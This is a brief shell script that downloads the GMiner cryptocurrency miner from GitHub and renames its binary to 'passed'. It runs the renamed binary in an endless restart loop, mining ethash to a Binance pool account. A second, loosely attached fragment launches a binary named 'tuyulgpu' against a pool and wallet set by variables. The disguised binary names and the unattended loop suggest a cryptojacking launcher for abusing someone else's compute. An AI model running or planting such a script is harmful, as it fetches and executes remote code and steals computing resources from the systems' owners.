#!/bin/sh
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.49/gminer_2_49_linux64.tar.xz
tar xf gminer_2_49_linux64.tar.xz
mv miner passed
while [ 1 ]; do
./passed --algo ethash --server ethash.poolbinance.com:1800 --user Minerhin.001 --pass 123456 --watchdog 0 --ssl 0
sleep 10
done

chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
